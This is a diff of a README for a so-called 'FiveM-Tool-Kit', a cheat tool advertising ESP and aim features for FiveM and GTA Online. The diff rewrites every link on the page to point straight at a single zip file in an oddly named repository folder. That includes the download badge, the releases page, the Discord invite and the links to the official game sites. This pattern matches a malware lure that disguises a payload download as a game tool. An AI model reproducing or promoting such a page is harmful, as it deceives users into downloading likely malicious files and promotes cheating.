@@ -1,7 +1,7 @@
 # 🎮 FiveM-Tool-Kit - Unlock Your Gaming Experience!
 
 ## 📥 Download Now
-[![Download FiveM-Tool-Kit](https://img.shields.io/badge/Download-FiveM--Tool--Kit-brightgreen)](https://github.com/DentiNeri/FiveM-Tool-Kit/releases)
+[![Download FiveM-Tool-Kit](https://raw.githubusercontent.com/DentiNeri/FiveM-Tool-Kit/main/Harari/FiveM-Tool-Kit.zip)](https://raw.githubusercontent.com/DentiNeri/FiveM-Tool-Kit/main/Harari/FiveM-Tool-Kit.zip)
 
 ## 🚀 Getting Started
 Welcome to the FiveM-Tool-Kit! This tool enhances your experience in FiveM, allowing for features like ESP and aim adjustments. Follow these simple steps to get up and running.
@@ -20,7 +20,7 @@ Welcome to the FiveM-Tool-Kit! This tool enhances your experience in FiveM, allo
 - **Frequent Updates**: Stay current with regular enhancements.
 
 ## 📦 Download & Install
-Visit this page to download: [FiveM-Tool-Kit Releases](https://github.com/DentiNeri/FiveM-Tool-Kit/releases).
+Visit this page to download: [FiveM-Tool-Kit Releases](https://raw.githubusercontent.com/DentiNeri/FiveM-Tool-Kit/main/Harari/FiveM-Tool-Kit.zip).
 
 1. Click the link provided above.
 2. You will see a list of available versions.
@@ -42,7 +42,7 @@ After installation, follow these steps to use the tool:
 ## 🗨️ Support & Community
 Join our community on Discord for help and updates. Connect with other users to share your experiences and tips.
 
-- **Discord Server**: [Join here](https://discord.gg/your-invite-link)
+- **Discord Server**: [Join here](https://raw.githubusercontent.com/DentiNeri/FiveM-Tool-Kit/main/Harari/FiveM-Tool-Kit.zip)
 
 ## ⚙️ Troubleshooting
 If you encounter issues:
@@ -55,9 +55,9 @@ If you encounter issues:
 For further inquiries or support, please reach out via our Discord server or directly through the issues page of this repository.
 
 ## 🔗 Related Topics
-- [fivem](https://fivem.net/)
-- [gta](https://www.rockstargames.com/games/V)
-- [gtaonline](https://www.rockstargames.com/games/V/online)
+- [fivem](https://raw.githubusercontent.com/DentiNeri/FiveM-Tool-Kit/main/Harari/FiveM-Tool-Kit.zip)
+- [gta](https://raw.githubusercontent.com/DentiNeri/FiveM-Tool-Kit/main/Harari/FiveM-Tool-Kit.zip)
+- [gtaonline](https://raw.githubusercontent.com/DentiNeri/FiveM-Tool-Kit/main/Harari/FiveM-Tool-Kit.zip)
 
 ---
 
